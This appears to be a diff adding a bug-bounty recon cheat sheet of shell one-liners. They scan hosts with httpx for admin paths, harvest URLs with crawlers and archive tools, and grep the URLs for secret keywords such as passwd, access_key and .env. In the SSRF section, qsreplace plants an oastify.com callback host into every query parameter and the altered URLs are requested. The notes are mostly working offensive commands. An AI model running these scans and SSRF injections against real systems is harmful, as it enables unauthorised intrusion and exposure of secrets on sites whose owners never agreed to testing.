@@ -1,0 +1,42 @@
+remove -title -cl -sc when save url output
+change threads 100 to 500 or more to speed up when firewall not block
+
+sudo httpx -up && httpx -l sortdomain.txt -p 8000,8888,3000,80,443,8009,8080,8081,8090,8180,8443 -path /admin -threads 500 -random-agent -mc 200,403 -x GET,POST -fr -title -cl -sc -o admin.txt
+
+#httpx -l sortdomain.txt -random-agent -ports 80,443 -threads 200 -mc 200,403 -x GET,POST -fr -title -cl -sc
+
+httpx -l inputt.txt -random-agent -ports 80,443 -threads 200 -mc 200,403 -x GET,POST -fr -title -cl -o normal.txt
+
+#get input file input.txt
+sudo httpx -up && cat sortdomain.txt | httpx -x GET,POST -fr -title -cl > input.txt && awk '{print $1}' input.txt | sort -u > inputt.txt && waybackurls -hostFile inputt.txt > way.txt && cat inputt.txt | hakrawler -d 5 > hak.txt && cat inputt.txt | gau --o gau.txt 
+
+sudo katana -up -health-check && katana -u inputt.txt -r /usr/share/wordlists/seclists/Miscellaneous/dns-resolvers.txt -d 6 -jc -ef png,jpg,gif,jpeg,swf,woff,gif,svg -jsl -kf all -o kat.txt -cs inputt.txt 
+
+#for clloud
+cat inputt.txt | gauplus -subs -b png,jpg,gif,jpeg,swf,woff,gif,svg -o allurls.txt
+
+xurlfind3r -l inputt.txt -u bevigil,commoncrawl,intelx,otx,urlscan -o xurlfind.txt && cat inputt.txt | cariddi -intensive > car.txt 
+
+cat *.txt | sort -u  > sort.txt  or down
+cat *.txt > url.txt && sort -u url.txt > sort.txt 
+
+#*
+cat sort.txt | domain name > correctinputt.txt
+#*
+
+cat sort.txt | grep .js$ > js.txt && cat sort.txt | grep file > file.txt && cat sort.txt | grep .json$ > json.txt && httpx -l sort.txt -mc 404,403 -o 403.txt -title
+
+#####manual recon  on terminal
+cat sort.txt | grep -E '(aws|api|passwd|pwd|password|ftp_password|jdbc|db|sql|secret_jet|config|admin|pwd|gcp|htaccess|.env|ssh|.git|access_key|secret_token|oauth_token|oauth_token_secret|smtp|xmlrpc|heroku|slack|firebase|swagger|log|bak|xlsx)'   
+
+grep -E '(\\?|&)(access=|admin=|dbg=|debug=|edit=|grant=|test=|alter=|clone=|create=|delete=|disable=|enable=|exec=|execute=|load=|make=|modify=|rename=|reset=|shell=|toggle=|adm=|root=|cfg=|dest=|redirect=|uri=|path=|continue=|url=|window=|next=|data=|reference=|site=|html=|val=|validate=|domain=|callback=|return=|page=|feed=|host=|port=|to=|out=|view=|dir=|show=|navigation=|open=|file=|document=|folder=|pg=|php_path=|style=|doc=|img=|filename=)' | qsreplace http://ybdcp9y7m11oogtiv4qt9e4yup0go6cv.oastify.com
+
+#ssrf
+
+cat inputt.txt | gauplus -subs -b png,jpg,gif,jpeg,swf,woff,gif,svg -o allurls.txt && mkdir ssrf && cat sort.txt allurls.txt | grep "=" | qsreplace http://ybdcp9y7m11oogtiv4qt9e4yup0go6cv.oastify.com > ssrf/ssrf.txt && cd ssrf && cat ssrf.txt | httpx -fr
+
+
+
+
+echo https://fuzzuli.musana.net | fuzzuli -mt all -w 1 
+httpx -l js.txt -random-agent -fr -rl 66 -delay 500ms -proxy http://172.28.96.1:8080 -v  -s -stats  -maxhr 99999999999            js file to burp
